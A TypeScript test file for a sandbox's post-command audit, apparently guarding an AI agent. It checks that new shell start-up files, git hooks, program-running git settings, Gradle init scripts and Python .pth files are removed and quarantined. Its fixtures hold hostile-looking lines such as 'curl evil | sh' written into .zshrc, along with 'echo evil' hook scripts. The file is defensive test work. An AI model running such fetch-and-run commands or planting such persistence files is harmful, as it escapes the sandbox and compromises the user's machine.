// The audit after a command, on a real folder: what a command created is taken away and said, what was there before is left.
import assert from "node:assert/strict";
import {
    chmodSync,
    existsSync,
    lstatSync,
    mkdirSync,
    mkdtempSync,
    readdirSync,
    readFileSync,
    readlinkSync,
    realpathSync,
    rmSync,
    symlinkSync,
    writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, test } from "node:test";
import { audit, takeSnapshot } from "../src/audit.ts";
import type { AuditContext } from "../src/audit.ts";
import { nodeFiles } from "../src/files.ts";
import { computeRules } from "../src/rules.ts";
import type { RuleSet, RulesInput } from "../src/rules.ts";

let root: string;
let home: string;
let project: string;
let quarantine: string;
beforeEach(() => {
    root = realpathSync(mkdtempSync(path.join(tmpdir(), "jig-audit-test-")));
    home = path.join(root, "home");
    project = path.join(home, "work", "orders");
    quarantine = path.join(root, "agent", "jig-sandbox", "removed");
    mkdirSync(project, { recursive: true });
    mkdirSync(path.join(root, "tmp", "session", "tmp"), { recursive: true });
    mkdirSync(path.join(root, "tmp", "session", "broker"), { recursive: true });
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

const put = (file: string, text = ""): string => {
    const full = path.isAbsolute(file) ? file : path.join(home, file);
    mkdirSync(path.dirname(full), { recursive: true });
    writeFileSync(full, text);
    return full;
};

function rulesFor(over: Partial<RulesInput> = {}): RuleSet {
    return computeRules({
        platform: "linux",
        wsl: false,
        home,
        uid: 1000,
        cwd: project,
        agentDir: path.join(root, "agent"),
        tmp: [path.join(root, "tmp")],
        sessionDir: path.join(root, "tmp", "session", "broker"),
        sessionTmp: path.join(root, "tmp", "session", "tmp"),
        env: { PATH: `${path.join(home, "bin")}:/usr/bin` },
        runtimePaths: [],
        protectedPaths: [],
        settings: { share: [], hide: [], lock: [] },
        approved: [],
        createdByAgent: new Set(),
        files: nodeFiles,
        ...over,
    });
}

const context = (): AuditContext => ({ quarantine, home, now: () => Date.UTC(2026, 9, 31, 12, 0, 0) });

/** Takes the snapshot, lets `command` change the machine as a command would, and audits. */
function around(command: () => void, over: Partial<RulesInput> = {}) {
    const set = rulesFor(over);
    const snapshot = takeSnapshot(set);
    command();
    return audit(snapshot, set, context());
}

const kept = (): string[] => (existsSync(quarantine) ? readdirSync(quarantine) : []);

describe("a locked path that was not there", () => {
    test("a start-up file the command made is taken away, kept, and said", () => {
        const result = around(() => put(".zshrc", "curl evil | sh\n"));
        assert.equal(existsSync(path.join(home, ".zshrc")), false);
        assert.deepEqual(result.lines, [
            "[sandbox] removed ~/.zshrc: the command created it, and your shells run it outside the sandbox.",
        ]);
        assert.match(
            result.notices[0] ?? "",
            /^jig-sandbox: removed ~\/\.zshrc, which a command created and your shells run it outside the sandbox\. A copy is in /,
        );
        assert.equal(kept().length, 1);
        assert.match(kept()[0] ?? "", /^2026-10-31T12-00-00-000Z-\.zshrc$/);
        assert.equal(readFileSync(path.join(quarantine, kept()[0] as string), "utf8"), "curl evil | sh\n");
    });

    test("a Gradle init script folder the command made goes with what is in it", () => {
        const result = around(() => put(".gradle/init.d/evil.gradle", "println 'evil'\n"));
        assert.equal(existsSync(path.join(home, ".gradle", "init.d")), false);
        assert.match(
            result.lines[0] ?? "",
            /removed ~\/\.gradle\/init\.d: the command created it, and your builds run it/,
        );
        assert.equal(
            existsSync(path.join(home, ".gradle")),
            true,
            "the folder around it, which may be Gradle's own, stays",
        );
    });

    test("a folder on PATH that was not there, with a program in it", () => {
        const result = around(() => {
            put("bin/git", "#!/bin/sh\necho evil\n");
            chmodSync(path.join(home, "bin", "git"), 0o755);
        });
        assert.equal(existsSync(path.join(home, "bin")), false);
        assert.match(
            result.lines[0] ?? "",
            /removed ~\/bin: the command created it, and programs in it run outside the sandbox/,
        );
    });

    test("what Pi would load from the project", () => {
        const result = around(() => put(path.join(project, ".pi", "extensions", "x.ts"), "export default () => {}\n"));
        assert.equal(existsSync(path.join(project, ".pi", "extensions")), false);
        assert.equal(existsSync(path.join(project, ".pi")), true);
        assert.match(result.lines[0] ?? "", /removed ~\/work\/orders\/\.pi\/extensions/);
    });

    test("nothing is removed when nothing was made", () => {
        const result = around(() => put(path.join(project, "src", "a.ts"), "ok\n"));
        assert.deepEqual(result, { lines: [], notices: [], createdSecrets: [] });
        assert.deepEqual(kept(), []);
    });

    test("a path that was already there is not touched by the audit, as the sandbox protects it", () => {
        put(".zshrc", "mine\n");
        const result = around(() => undefined);
        assert.deepEqual(result.lines, []);
        assert.equal(readFileSync(path.join(home, ".zshrc"), "utf8"), "mine\n");
    });

    test("a locked path that is the home folder itself, or the root, is never removed", () => {
        const result = around(() => undefined, { settings: { share: [], hide: [], lock: ["/", home, "/home"] } });
        assert.deepEqual(result.lines, []);
        assert.equal(existsSync(home), true);
    });

    test("if it cannot be kept it is still taken away", () => {
        mkdirSync(path.dirname(quarantine), { recursive: true });
        writeFileSync(quarantine, "a file where the folder should be");
        const set = rulesFor();
        const snapshot = takeSnapshot(set);
        put(".zshrc", "evil\n");
        const result = audit(snapshot, set, context());
        assert.equal(existsSync(path.join(home, ".zshrc")), false);
        assert.match(result.notices[0] ?? "", /removed ~\/\.zshrc/);
        assert.doesNotMatch(result.notices[0] ?? "", /A copy is in/);
    });
});

describe("a locked link that was replaced", () => {
    test("is put back as the link it was", () => {
        put("dotfiles/bashrc", "# mine\n");
        symlinkSync(path.join(home, "dotfiles", "bashrc"), path.join(home, ".bashrc"));
        const result = around(() => {
            rmSync(path.join(home, ".bashrc"));
            writeFileSync(path.join(home, ".bashrc"), "evil\n");
        });
        assert.equal(lstatSync(path.join(home, ".bashrc")).isSymbolicLink(), true);
        assert.equal(readlinkSync(path.join(home, ".bashrc")), path.join(home, "dotfiles", "bashrc"));
        assert.equal(readFileSync(path.join(home, ".bashrc"), "utf8"), "# mine\n");
        assert.deepEqual(result.lines, [
            "[sandbox] put ~/.bashrc back as the link it was: the command replaced it, and your shells run it outside the sandbox.",
        ]);
        assert.equal(readFileSync(path.join(quarantine, kept()[0] as string), "utf8"), "evil\n");
    });

    test("also when the link was only removed", () => {
        put("dotfiles/bashrc", "# mine\n");
        symlinkSync(path.join(home, "dotfiles", "bashrc"), path.join(home, ".bashrc"));
        around(() => rmSync(path.join(home, ".bashrc")));
        assert.equal(readlinkSync(path.join(home, ".bashrc")), path.join(home, "dotfiles", "bashrc"));
    });

    test("a link that did not change is left alone", () => {
        put("dotfiles/bashrc", "# mine\n");
        symlinkSync(path.join(home, "dotfiles", "bashrc"), path.join(home, ".bashrc"));
        assert.deepEqual(around(() => undefined).lines, []);
    });
});

describe("git hooks", () => {
    test("a new hook in the working folder's repository is taken away, a sample and an old hook are left", () => {
        put(path.join(project, ".git", "hooks", "pre-push"), "#!/bin/sh\n");
        put(path.join(project, ".git", "hooks", "pre-commit.sample"), "# sample\n");
        const result = around(() => {
            put(path.join(project, ".git", "hooks", "pre-commit"), "#!/bin/sh\necho evil\n");
            put(path.join(project, ".git", "hooks", "commit-msg.sample"), "# sample\n");
        });
        assert.deepEqual(readdirSync(path.join(project, ".git", "hooks")).sort(), [
            "commit-msg.sample",
            "pre-commit.sample",
            "pre-push",
        ]);
        assert.deepEqual(result.lines, [
            "[sandbox] removed ~/work/orders/.git/hooks/pre-commit: the command created a git hook, and git runs hooks outside the sandbox.",
        ]);
    });

    test("in a repository the command made, which had no protection while it ran", () => {
        const result = around(() => {
            put(path.join(project, "fresh", ".git", "hooks", "post-checkout"), "#!/bin/sh\n");
            put(path.join(project, "fresh", ".git", "hooks", "applypatch-msg.sample"), "# sample\n");
        });
        assert.deepEqual(readdirSync(path.join(project, "fresh", ".git", "hooks")), ["applypatch-msg.sample"]);
        assert.match(result.lines[0] ?? "", /removed ~\/work\/orders\/fresh\/\.git\/hooks\/post-checkout/);
    });

    test("in the repository around the working folder", () => {
        mkdirSync(path.join(project, ".git", "hooks"), { recursive: true });
        const inner = path.join(project, "src");
        mkdirSync(inner, { recursive: true });
        const result = around(() => put(path.join(project, ".git", "hooks", "pre-commit"), "#!/bin/sh\n"), {
            cwd: inner,
        });
        assert.equal(existsSync(path.join(project, ".git", "hooks", "pre-commit")), false);
        assert.equal(result.lines.length, 1);
    });
});

describe("git configuration", () => {
    const config = (text: string): string => put(path.join(project, ".git", "config"), text);
    const GOOD = '[core]\n\tbare = false\n[remote "origin"]\n\turl = https://example.invalid/orders.git\n';

    test("a program-running setting is taken out and the rest of the change stays", () => {
        config(GOOD);
        const result = around(() => {
            config(
                `${GOOD}[core]\n\tfsmonitor = /tmp/evil\n[branch "main"]\n\tremote = origin\n[alias]\n\tst = !evil\n\tco = checkout\n`,
            );
        });
        const after = readFileSync(path.join(project, ".git", "config"), "utf8");
        assert.equal(after, `${GOOD}[core]\n[branch "main"]\n\tremote = origin\n[alias]\n\tco = checkout\n`);
        assert.deepEqual(result.lines, [
            "[sandbox] removed core.fsmonitor, alias.st from ~/work/orders/.git/config: git would run it outside the sandbox. The rest of your change stays.",
        ]);
    });

    test("a setting that was there before is left alone", () => {
        config(`${GOOD}[core]\n\tpager = less\n`);
        const result = around(() => config(`${GOOD}[core]\n\tpager = less\n[user]\n\tname = Me\n`));
        assert.deepEqual(result.lines, []);
        assert.match(readFileSync(path.join(project, ".git", "config"), "utf8"), /pager = less/);
    });

    test("an ordinary change, a remote and a tracking branch, is not touched", () => {
        config(GOOD);
        const changed = `${GOOD}[remote "upstream"]\n\turl = https://example.invalid/up.git\n[branch "main"]\n\tmerge = refs/heads/main\n`;
        const result = around(() => config(changed));
        assert.deepEqual(result.lines, []);
        assert.equal(readFileSync(path.join(project, ".git", "config"), "utf8"), changed);
    });

    test("in a repository made by the command, whose configuration had nothing before", () => {
        const result = around(() => {
            put(
                path.join(project, "new", ".git", "config"),
                "[core]\n\tbare = false\n\tfsmonitor = true\n\thooksPath = /tmp/hooks\n",
            );
        });
        assert.equal(readFileSync(path.join(project, "new", ".git", "config"), "utf8"), "[core]\n\tbare = false\n");
        assert.match(
            result.lines[0] ?? "",
            /removed core\.fsmonitor, core\.hookspath from ~\/work\/orders\/new\/\.git\/config/,
        );
    });

    test("a per-worktree configuration too", () => {
        config(GOOD);
        around(() => put(path.join(project, ".git", "config.worktree"), "[core]\n\tpager = evil\n"));
        assert.equal(readFileSync(path.join(project, ".git", "config.worktree"), "utf8"), "[core]\n");
    });
});

describe("python start-up files", () => {
    test("a new .pth file in the user's site-packages is taken away, an old one is left", () => {
        const folder = path.join(home, ".local", "lib", "python3.12", "site-packages");
        put(path.join(folder, "old.pth"), "/old\n");
        const result = around(() => put(path.join(folder, "evil.pth"), "import os\n"));
        assert.deepEqual(readdirSync(folder), ["old.pth"]);
        assert.match(
            result.lines[0] ?? "",
            /removed ~\/\.local\/lib\/python3\.12\/site-packages\/evil\.pth: the command created it, and Python runs \.pth files/,
        );
    });
});

describe("secret files the command made", () => {
    test("are the agent's own: they are listed so the rules do not hide them", () => {
        put(path.join(project, ".env"), "existing\n");
        const result = around(() => {
            put(path.join(project, ".env.test"), "fresh\n");
            put(path.join(project, "plain", "x.pem"), "pem\n");
        });
        assert.deepEqual(result.createdSecrets, [path.join(project, ".env.test")]);
    });

    test("in a repository the command made", () => {
        const result = around(() => {
            mkdirSync(path.join(project, "new", ".git"), { recursive: true });
            put(path.join(project, "new", ".env"), "x\n");
        });
        assert.deepEqual(result.createdSecrets, [path.join(project, "new", ".env")]);
    });
});
